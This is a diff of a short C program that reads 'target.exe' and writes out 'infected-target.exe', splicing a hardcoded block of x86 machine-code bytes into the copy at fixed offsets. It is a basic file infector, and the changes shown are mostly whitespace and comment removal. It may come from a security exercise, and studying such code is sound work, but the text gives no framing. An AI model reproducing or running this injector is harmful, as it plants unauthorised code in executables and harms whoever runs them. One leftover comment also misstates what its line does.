@@ -7,11 +7,9 @@ void main() {
     FILE *file;
     file = fopen("target.exe","rb");
     int c;
-
     int i = 0;
     FILE *write_ptr;
-
-    write_ptr = fopen("infected-target.exe","wb");  // w for write, b for binary
+    write_ptr = fopen("infected-target.exe","wb");
 
     unsigned char ucDataBlock[45] = {
         0xC9, 0xC3, 0xC7, 0x04, 0x24, 0x48, 0x84, 0x04, 0x08, 0xE8, 0x9A, 0xFE,
@@ -25,12 +23,11 @@ void main() {
     };
 
     while( (c = fgetc(file)) != EOF ) {
-
-
+        
             if (i == 1080) {
                 int k;
                 for (k = 0; k < 45; k++) {
-                    fwrite(&ucDataBlock[k],1,1,write_ptr); // write 10 bytes from our buffer
+                    fwrite(&ucDataBlock[k],1,1,write_ptr);
                     c = fgetc(file);
                 }
                 i = 1124;
@@ -44,16 +41,9 @@ void main() {
                 }
                 i = 1180;
             }
-                fwrite(&c,1,1,write_ptr); // write 10 bytes from our buffer
+            
+            fwrite(&c,1,1,write_ptr); // write 10 bytes from our buffer
 
-	   
             i += 1;    
     }
-
-
-    
-
-
-
-
 }
